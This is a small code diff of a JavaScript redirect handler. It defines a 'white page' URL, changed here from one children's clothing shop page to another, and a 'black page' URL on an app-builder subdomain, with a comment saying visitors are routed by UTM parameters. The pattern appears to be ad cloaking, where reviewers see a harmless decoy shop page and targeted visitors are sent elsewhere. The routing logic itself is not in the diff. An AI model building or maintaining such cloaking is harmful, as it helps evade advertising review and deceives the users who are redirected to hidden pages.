@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.trigema.de/en/baby-clothes/T-shirt-with-funny-slogan-print-navy-blue-92.html";
+    const whitePageURL = "https://iloveminti.com/collections/summer-2526-boys-sweats/products/mnt1124-s25-sut-cr";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
